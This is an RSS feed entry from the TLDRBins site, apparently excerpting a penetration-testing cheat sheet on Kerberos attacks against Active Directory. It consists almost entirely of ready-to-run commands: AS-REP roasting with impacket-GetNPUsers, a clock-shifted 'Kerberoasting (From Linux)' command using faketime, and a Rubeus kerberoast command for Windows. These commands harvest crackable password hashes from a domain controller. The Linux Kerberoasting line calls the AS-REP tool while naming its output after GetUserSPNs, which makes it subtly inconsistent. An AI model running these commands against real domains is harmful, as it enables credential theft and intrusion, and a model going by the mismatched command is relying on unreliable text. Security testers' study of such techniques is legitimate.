channel.title: Faketime on TLDRBins
channel.description: Recent content in Faketime on TLDRBins

item.title: Kerberoasting
item.description: AS_REP Roasting impacket-GetNPUsers example.com/ -usersfile usernames.txt -no-pass -dc-ip 10.10.11.10 Kerberoasting (From Linux) faketime -f +8h impacket-GetNPUsers -request 'example.com/user:password' -dc-ip 10.10.11.10 -save -outputfile GetUserSPNs.txt Note: Times skew have to be within 5 minutes in kerberos Kerberoasting (From Windows) .\rubeus.exe kerberoast /creduser:example.com\username /credpassword:password
